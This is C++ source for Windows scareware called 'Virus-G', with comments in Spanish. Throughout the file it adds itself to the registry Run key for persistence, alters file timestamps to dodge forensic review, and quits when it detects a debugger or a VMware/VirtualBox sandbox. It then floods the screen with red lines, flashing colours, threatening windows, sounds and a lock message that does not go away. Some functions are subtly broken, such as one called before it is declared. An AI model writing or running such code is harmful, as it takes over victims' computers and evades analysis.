#include <windows.h>
#include <mmsystem.h>
#include <thread>
#include <cstdlib>
#include <ctime>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "winmm.lib")  // Para reproducir audio

int screenWidth = GetSystemMetrics(SM_CXSCREEN);
int screenHeight = GetSystemMetrics(SM_CYSCREEN);

// Función para asegurar persistencia: agrega el malware al inicio del sistema.
void setPersistence() {
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* exeName = "Virus-G";

    // Crear la entrada en el registro para ejecutarse al inicio
    if (RegOpenKeyEx(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char filePath[MAX_PATH];
        GetModuleFileName(NULL, filePath, MAX_PATH);
        RegSetValueEx(hKey, exeName, 0, REG_SZ, (const BYTE*)filePath, strlen(filePath) + 1);
        RegCloseKey(hKey);
    }
}

// **Técnicas Anti-Forense Avanzadas**:

// Modificar las fechas de acceso/creación para que el archivo no se vea sospechoso.
void modifyTimestamps() {
    HANDLE hFile = CreateFile("VirusG.exe", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        SYSTEMTIME st;
        GetSystemTime(&st);
        FILETIME ft;
        SystemTimeToFileTime(&st, &ft);
        SetFileTime(hFile, &ft, &ft, &ft);  // Modificar las fechas
        CloseHandle(hFile);
    }
}

// **Técnicas Anti-Debugging Avanzadas**:

// Detección más avanzada de herramientas de depuración.
bool isDebuggerPresent() {
    return IsDebuggerPresent() || checkDebuggerTools();
}

bool checkDebuggerTools() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::string fileName(buffer);

    // Detectar herramientas de depuración
    const std::vector<std::string> debuggers = {"ollydbg", "x32dbg", "ida", "debugger"};
    for (const auto& debugger : debuggers) {
        if (fileName.find(debugger) != std::string::npos) {
            return true;
        }
    }
    return false;
}

// Detectar la ejecución en entornos de prueba (sandbox).
bool isSandbox() {
    DWORD len = 0;
    char szBuffer[1024];

    // Detectar VMware y VirtualBox
    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk", "VMware", RRF_RT_REG_SZ, NULL, &szBuffer, &len) == ERROR_SUCCESS) {
        return true;
    }
    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxDrv", "VBox", RRF_RT_REG_SZ, NULL, &szBuffer, &len) == ERROR_SUCCESS) {
        return true;
    }

    return false;
}

// **Efectos visuales aterradores**:

// Lluvia de sangre con más complejidad (más líneas, más interacción con la pantalla).
void bloodRain() {
    HDC hdc = GetDC(NULL);
    HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
    SelectObject(hdc, hPen);
    srand(time(0));

    while (true) {
        int x = rand() % screenWidth;
        int y1 = rand() % screenHeight;
        int y2 = y1 + (rand() % 100);
        MoveToEx(hdc, x, y1, NULL);
        LineTo(hdc, x, y2);
        Sleep(30);  // Lluvia más rápida
    }
}

// Pantalla con efectos de parpadeo espeluznantes y colores distorsionados.
void flashScreen() {
    while (true) {
        system("color 0C");  // Rojo sangre
        Sleep(200);
        system("color 0A");  // Verde tóxico
        Sleep(200);
        system("color 04");  // Rojo de nuevo
        Sleep(200);
        system("color 07");  // Blanco normal
        Sleep(200);
    }
}

// Efectos visuales de distorsión y ventanas rotas.
void brokenWindowEffect() {
    srand(time(0));
    while (true) {
        int x = rand() % (screenWidth - 500);
        int y = rand() % (screenHeight - 400);

        HWND hwnd = CreateWindow("STATIC", "¡Estás atrapado en una pesadilla!",
                                 WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                 x, y, 500, 400, NULL, NULL, NULL, NULL);

        // Crear distorsión en la ventana (por ejemplo, grietas, rotaciones)
        for (int i = 0; i < 5; ++i) {
            SendMessage(hwnd, WM_SIZE, 0, 0);  // Hacer que la ventana cambie de tamaño
            Sleep(300);  // Distorsionar la ventana rápidamente
        }

        Sleep(3000);  // Mantener la ventana rota por un tiempo
        DestroyWindow(hwnd);
    }
}

// **Efectos de terror adicional**:

// Reproduce sonidos aterradores aleatorios en segundo plano.
void playScarySounds() {
    mciSendString("open scare1.wav type waveaudio alias sound1", NULL, 0, NULL);
    mciSendString("play sound1 repeat", NULL, 0, NULL);

    srand(time(0));
    while (true) {
        if (rand() % 5 == 0) {
            mciSendString("play sound1", NULL, 0, NULL);  // Reproducir un sonido espeluznante
        }
        Sleep(1000);
    }
}

// **Mostrar imágenes aterradoras**:

// Mostrar imágenes espeluznantes en pantallas aleatorias.
void showScaryImages() {
    while (true) {
        HWND hwnd = CreateWindow("STATIC", "Imagen Aterradora", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, NULL, NULL);
        const char* imagePath = "scary_image.bmp";  // Imagen aterradora
        SendMessage(hwnd, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)LoadImage(NULL, imagePath, IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
        Sleep(3000);  // Mostrar imagen durante 3 segundos
        DestroyWindow(hwnd);
    }
}

// Bloquear la pantalla con un mensaje aterrador.
void lockScreen() {
    HWND hwnd = CreateWindow("STATIC", "¡ESTÁS ATRAPADO! No puedes salir.",
                             WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, NULL, NULL);

    while (true) {
        // Cambiar el mensaje para hacerlo más aterrador.
        SetWindowText(hwnd, "¡ES DEMASIADO TARDE PARA ESCAPAR!");
        Sleep(1000);
    }
}

// **Función principal**:

int main() {
    if (isDebuggerPresent() || checkDebuggerTools() || isSandbox()) {
        std::cout << "Entorno de depuración o sandbox detectado. Terminando ejecución." << std::endl;
        return 1;
    }

    setPersistence();
    modifyTimestamps();

    // Crear hilos para efectos y sonido
    std::thread t1(bloodRain);
    std::thread t2(flashScreen);
    std::thread t3(brokenWindowEffect);
    std::thread t4(playScarySounds);
    std::thread t5(showScaryImages);
    std::thread t6(lockScreen);

    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    t6.join();

    return 0;
}

